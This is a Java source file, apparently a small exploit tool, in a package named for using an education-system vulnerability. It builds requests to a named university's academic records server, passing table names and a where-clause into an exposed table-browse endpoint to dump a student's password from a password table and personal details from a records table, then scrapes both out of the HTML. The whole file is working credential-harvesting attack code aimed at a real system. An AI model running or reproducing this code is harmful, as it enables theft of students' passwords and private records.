package edu_vul_use;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class client {
	public static String request(String url) 
	{
		StringBuffer bs = new StringBuffer();
		try {
			URL url_need = new URL(url);
			URLConnection urlcon;
			urlcon = url_need.openConnection();
			InputStream is = urlcon.getInputStream();
			BufferedReader buffer = new BufferedReader(new InputStreamReader(is));
			String l = null;
				while((l=buffer.readLine())!=null)
			 		{
					bs.append(l).append("/n");
			 		}           

		    } catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		    						}
		return bs.toString();
		
	}
	public static ArrayList <String> re_info(String s)//regular match html to get info
	{	
		ArrayList <String> info_list= new ArrayList<String>(); 
		String temp="";
		Pattern pattern = Pattern.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
		Matcher matcher = pattern.matcher(s);
		if(matcher.find())
			{
			temp=matcher.group(0);
			pattern = Pattern.compile("<TD ALIGN=\"LEFT\">");
			matcher = pattern.matcher(temp);
			temp=matcher.replaceAll("?");
			pattern = Pattern.compile("</TD>/n");
			matcher = pattern.matcher(temp);
			temp=matcher.replaceAll(" ");
			}

		while (temp.indexOf("?")>=0)
		{
			int start=temp.indexOf("?");
			temp=temp.substring(start+1);
			int end=temp.indexOf("?");
			try
				{
				String content=temp.substring(0, end);
				if (!content.equals(" "))
					{
					info_list.add(content);	
					System.out.println("content:"+content);
					}
				}
			catch(Exception e)
			{
				//½áÊø
			}	
		}
		return info_list;
		}
	
	public static String re_password(String s)//regular match html to get password
	{	String temp="";
		Pattern pattern = Pattern.compile("<TD ALIGN=\"LEFT\">.*</TD>/n<TD ALIGN=\"LEFT\">");
		Matcher matcher = pattern.matcher(s);
		if(matcher.find())
			{
			temp=matcher.group(0);
			pattern = Pattern.compile("<TD ALIGN=\"LEFT\">");
			matcher = pattern.matcher(temp);
			temp=matcher.replaceAll("?");
			pattern = Pattern.compile("</TD>/n");
			matcher = pattern.matcher(temp);
			temp=matcher.replaceAll(" ");
			}
		temp=temp.substring(1);
		int start=temp.indexOf("?");
		temp=temp.substring(start+1);
		int end=temp.indexOf("?");
		String pass=temp.substring(0, end);
		return pass;
		}
	public static String get_url_1(String sno)//get password url
	{
		String url="";
		url="http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XK_MMB&ccolumns=*&cclauses=where%20xh%20=%27"+sno+"%27&nrow_min=1&nrow_max=150";
		return url;		
		
	}
	public static String get_url_2(String sno)//get info url
	{
		String url="";
		url="http://jwxt.sdu.edu.cn:7890/pls/wwwbks/qcb.table_browse?ctable=XJ_XJB&ccolumns=*&cclauses=where%20xh%20=%27"+sno+"%27&nrow_min=1&nrow_max=150";
		return url;		
		
	}

}
